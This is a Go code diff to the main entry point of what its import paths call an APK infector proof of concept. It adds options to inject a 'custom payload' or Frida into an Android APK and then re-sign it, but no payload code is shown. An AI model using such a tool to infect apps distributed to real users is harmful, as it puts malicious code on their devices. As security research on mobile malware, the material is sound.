@@ -13,8 +13,11 @@ import (
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 	
 )
+
+var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject"
 
 func main() {
 
@@ -28,9 +31,20 @@ func main() {
 
 	log.SetOutput(logFile)
 
-	if len(os.Args) < 2 {
-		fmt.Println("Usage:\nmain input.apk output.apk")
+	if os.Args[1] == "-h" {
+		fmt.Println(help_str)
 		return
+	}
+
+	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2") {
+		fmt.Println(help_str)
+		return
+	}
+
+	if os.Args[4] == "1" {
+		utils.Payload_option = int(utils.Custom_payload)
+	} else if os.Args[4] == "2" {
+		utils.Payload_option = int(utils.Frida_payload)
 	}
 
 	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
@@ -62,6 +76,8 @@ func main() {
 
 	fmt.Println("Injecting...")
 	injector.Inject(os.Args[1], os.Args[2])
+
+	utils.Cleanup()
 
 	fmt.Println("Done! Now you should sign your apk")
 }
